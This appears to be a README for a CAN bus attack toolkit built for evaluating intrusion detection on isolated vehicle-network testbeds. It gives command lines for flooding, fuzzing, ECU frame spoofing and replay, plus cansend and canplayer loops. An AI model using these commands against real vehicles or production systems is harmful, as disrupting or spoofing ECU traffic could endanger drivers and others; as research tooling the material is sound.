# CAN Bus Attack Toolkit (Research & IDS Evaluation)

This folder provides a, reproducible set of CAN bus attack profiles to evaluate Intrusion Detection Systems (IDS) and resilience mechanisms on an isolated testbed. The toolkit is implemented in Python using `python-can` for portability across Windows and Linux.

> Safety & Ethics: Perform these tests only on hardware you own or have explicit authorization to test. Use an isolated lab network. Do not deploy on public roads or production systems. You are solely responsible for compliant use.

## Features
- DoS Flood: Saturate the bus with repeated frames at configurable rates.
- Fuzzing: Random IDs/DLC/payloads to stress parsers and anomaly detectors.
- Spoof Injection: Mimic target ECU frames with crafted payloads.
- Replay: Resend traffic captured in logs (CSV or candump-like text).
- Logging: Every sent frame recorded to CSV for analysis and reproducibility.

## Prerequisites
- Python 3.8+
- `python-can` library
- CAN adapter and driver
  - Windows: e.g., Peak PCAN (`bus_type=pcan`), Kvaser (`bus_type=kvaser`)
  - Linux: SocketCAN (`bus_type=socketcan`, `channel=can0`)

Install dependencies:

```bash
pip install python-can
```

Adapter notes:
- SocketCAN (Linux): `sudo ip link set can0 up type can bitrate 500000`
- PCAN (Windows): Use PCAN driver/app to configure bitrate/channel (e.g., `PCAN_USBBUS1`).
- Kvaser: Install CANlib and configure the device (channels `0`, `1`, etc.).

## Quick Start
Run from repository root or this folder.

```bash
python attacks/CANbus/can_attacks.py --help
```

All commands accept common arguments:
- `--bus-type`: python-can bustype (socketcan, pcan, kvaser, virtual)
- `--channel`: interface/channel (can0, PCAN_USBBUS1, 0)
- `--bitrate`: bitrate in bps (adapter-dependent)
- `--timing`: adapter-specific timing (optional)
- `--extended`: generate 29-bit IDs (when applicable)
- `--duration`: seconds to run (omit for indefinite)
- `--rate` or `--period`: pacing by rate (pps) or fixed period (s)
- `--log`: CSV log path (default: attacks/CANbus/logs/attack_log.csv)
- `--seed`: random seed for reproducibility

## Attack Profiles

### DoS Flood
Repeat a frame as fast as possible or at a set rate.

```bash
# Standard ID flood at 5k fps for 10s
python attacks/CANbus/can_attacks.py flood --bus-type socketcan --channel can0 \
  --id 0x123 --dlc 8 --payload-mode random --rate 5000 --duration 10

# If ID omitted, select from range using random/sequential mode
python attacks/CANbus/can_attacks.py flood --bus-type pcan --channel PCAN_USBBUS1 \
  --id-range 0x100-0x1FF --id-mode random --dlc 8 --period 0.0001 --duration 5
```

### Fuzzing
Randomize IDs, DLC, and payloads across ranges.

```bash
python attacks/CANbus/can_attacks.py fuzz --bus-type socketcan --channel can0 \
  --id-range 0x000-0x7FF --id-mode random --min-dlc 0 --max-dlc 8 \
  --payload-mode random --rate 500 --duration 30
```

### Spoof Injection
Craft frames with a specified ID and payload to mimic an ECU.

```bash
# Fixed 20 ms period, 10-second duration
python attacks/CANbus/can_attacks.py spoof --bus-type kvaser --channel 0 \
  --id 0x321 --dlc 8 --payload 01,02,03,04,05,06,07,08 --period 0.02 --duration 10
```

### Replay
Resend captured traffic from a CSV or candump-like text file.

CSV format (header required): `timestamp,id,is_extended,dlc,data_hex`
Candump text example line: `(1699999999.123456) can0 123#0102030405060708`

```bash
# Replay with timestamps preserved
python attacks/CANbus/can_attacks.py replay --bus-type socketcan --channel can0 \
  --input path/to/log.csv --preserve-timestamps

# Replay with fixed pacing and loop at EOF
python attacks/CANbus/can_attacks.py replay --bus-type pcan --channel PCAN_USBBUS1 \
  --input path/to/candump.txt --rate 200 --loop
```

## Logging & Reproducibility
- All sent frames are logged to a CSV at `--log`.
- Use `--seed` to make fuzzing payloads deterministic.
- For reports, include `bus_type`, `channel`, `bitrate`, `duration`, `rate/period`, and target ID/ranges.

## Notes & Limitations
- Error frames and arbitration manipulation are hardware/driver-specific and not supported here.
- Very high rates are limited by OS scheduling and adapter throughput.
- On Windows, ensure the adapter driver is installed and the bitrate/channel match your device config.

## can-utils (Linux) Alternatives
If you prefer shell-based tooling on Linux (SocketCAN):

```bash
# DoS flood (tight loop)
while true; do cansend can0 123#0102030405060708; done

# Fuzzing example
for i in $(seq 0 2047); do 
  data=$(head -c 8 /dev/urandom | hexdump -v -e '/1 "%02X"');
  cansend can0 $(printf "%03X" $i)#$data
done

# Replay from a candump log
canplayer -I capture.log
```

These examples are provided for completeness; the Python CLI is recommended for portability and controlled pacing.
